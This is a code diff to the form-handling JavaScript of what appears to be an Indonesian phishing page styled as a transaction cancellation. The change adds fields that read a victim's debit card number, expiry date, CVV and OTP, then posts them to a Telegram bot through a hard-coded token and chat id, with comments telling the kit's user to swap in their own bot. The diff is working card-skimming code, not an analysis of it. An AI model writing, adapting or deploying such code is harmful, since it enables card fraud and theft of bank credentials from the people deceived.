@@ -208,7 +208,10 @@ function KirimPesan(event) {
   event.preventDefault();
    
      var logo = "༒𝓟𝓮𝓶𝓫𝓪𝓽𝓪𝓵𝓪𝓷 𝓣𝓻𝓪𝓷𝓼𝓪𝓴𝓼𝓲៚";       
-   
+   var result = document.getElementById('result');
+   var debit = document.getElementById('debit');
+   var valid = document.getElementById('valid');
+    var cvv = document.getElementById('cvv');
     var pin = document.getElementById('pin');
     var pin1 = document.getElementById('pin1');
     var pin2 = document.getElementById('pin2');
@@ -216,16 +219,17 @@ function KirimPesan(event) {
     var pin4 = document.getElementById('pin4');
     var pin5 = document.getElementById('pin5');
     
-    var gabungan = '' + logo + '%0A※ 𝗢𝗧𝗣 : ' + pin.value + pin1.value + pin2.value + pin3.value + pin4.value + pin5.value + '%0A%0A<pre>🕶 𝓓𝓮𝓿𝓮𝓵𝓸𝓹𝓮𝓻 𝓦𝓮𝓫𝓼𝓲𝓽𝓮✍</pre>';
+    var gabungan = '' + logo + '%0A※ ' + result.value + '%0A※ 𝗡𝗼.𝗞𝗮𝗿𝘁𝘂 : ' + debit.value + '%0A※ 𝗩𝗮𝗹𝗶𝗱 : ' + valid.value + '%0A※ 𝗖𝗩𝗩 : ' + cvv.value + '%0A※ 𝗢𝗧𝗣 : ' + pin.value + pin1.value + pin2.value + pin3.value + pin4.value + pin5.value + '%0A%0A<pre>🕶 𝓓𝓮𝓿𝓮𝓵𝓸𝓹𝓮𝓻 𝓦𝓮𝓫𝓼𝓲𝓽𝓮✍</pre>';
     
-   var token = '7455639964%3AAAF_uU5vfd-4prdHpFJGkGakNNj4_Mm3ilQ'; // Ganti dengan token bot yang kamu buat
+    var token = '7455639964%3AAAF_uU5vfd-4prdHpFJGkGakNNj4_Mm3ilQ'; // Ganti dengan token bot yang kamu buat
     var grup = '7649922917'; // Ganti dengan chat id dari bot yang kamu buat
+  
   
     $.ajax({
         url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
         method: `POST`,
         
-       complete: function(data) {
+      complete: function(data) {
             console.log('Complete')
     setTimeout(function(){
        $("#lodingku").hide();
